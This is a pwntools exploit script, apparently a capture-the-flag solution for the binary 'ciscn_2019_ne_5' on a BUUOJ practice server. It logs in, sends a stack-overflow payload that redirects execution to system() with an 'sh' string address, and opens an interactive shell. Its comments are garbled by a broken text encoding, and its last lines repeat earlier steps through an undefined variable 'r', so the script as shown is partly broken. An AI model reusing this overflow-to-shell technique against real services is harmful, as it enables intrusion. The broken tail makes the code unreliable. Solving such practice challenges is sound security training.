
from pwn import*
elf=ELF('./ciscn_2019_ne_5')
p=remote('node4.buuoj.cn',29445)
#p=process('./ciscn_2019_ne_5')
context.log_level='debug'
system=elf.plt['system']
sh_addr=0x80482ea #ͨ��Ropgadget string ��ȡ

p.sendlineafter(b'password:',b'administrator')
p.recvuntil(b'0.Exit\n')
p.sendline(b'1')
payload=b'a'*(0x48+4)+p32(system)+p32(0xdeadbeef)+p32(sh_addr) 
#�м�������ַ�һ��Ҫ���� ��Ȼ�ͻ���0��� strcpy���Ʊ��ض�
p.sendlineafter(b"info:",payload)
p.recvuntil(b'0.Exit\n')
p.sendline(b'4')

p.interactive()

r.recvuntil(b'0.Exit\n:')
r.sendline(b'4')

r.interactive()
